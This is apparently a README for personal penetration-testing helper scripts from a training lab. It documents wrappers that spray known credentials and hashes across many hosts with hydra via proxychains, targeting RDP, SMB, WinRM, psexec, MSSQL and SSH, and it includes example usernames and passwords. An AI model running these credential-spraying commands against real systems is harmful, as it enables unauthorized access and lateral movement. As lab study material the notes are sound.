# Scripts

Well this is a mess, but tried to write some different scripts to try all credentials etc.


## Some examples

- Try RDP, on all IPs for one user
```
bash for_each_line.sh ~/tmp/task_relia/ips.txt  proxychains -q hydra -l jim -p Castello1!  ph1 -t 4 rdp
```

- Try "all" normal services, on all IPs for one user
Kind of doesn't work since hydra ? exits whole sequence early, WHY? Need to trap some signal or what?
```
bash ~/tmp/task_relia/scripts/for_each_line.sh ~/tmp/task_relia/ips.txt    bash ~/tmp/task_relia/scripts/ad.sh dryrun all pass ph1  michelle 'NotMyPassword0k?' relia.com 
```


## Check cred scripts

known_creds.txt format:  username <space> password
known_hashes.txt format: username <space> hashes

- Try all known creds on all IPs in file for given protocol
A bit more reasonable ad.sh
```
./more/try_all_known_creds.sh
echo ./more/try_all_known_creds.sh imap tmp_email_hosts.txt
```

- Try all auth methods (1 credential, 1 host), can be combined /w for_each_line.sh for multiple IPs and/or use try_known_creds for multiple creds.
TODO ad.sh doesn't really work since when hydra (?) fails it quits the whole script early.
```
ad.sh
ad.sh dryrun smb pass proxy 172.16.241.11 joe Flowers1 MEDTECH"
```

- Run ad.sh (above) on all known creds/hashes
TODO ad.sh doesn't really work since when hydra (?) fails it quits the whole script early.
```
try_known_creds.sh
try_known_creds.sh [<all/smb/smbexec/winrm/wmi/psexec/dcom/rdp/local-auth/mssql/ssh>] [<hash/pass>] [<proxy>] IP domain
```


## Helper scripts

- Run a command for each line in file, replacing "ph1" with said line
```
./more/for_each_line.sh ip.txt "echo here is a line: ph1"

```


## Modify files scripts

- Example: combine lines and encode for Authentication header in HTTP request
```
./more/combine_lines.sh
```

- AWK to add domain for each entry in users.txt > users_email.txt
```
./more/usernames_add_domain.sh
```
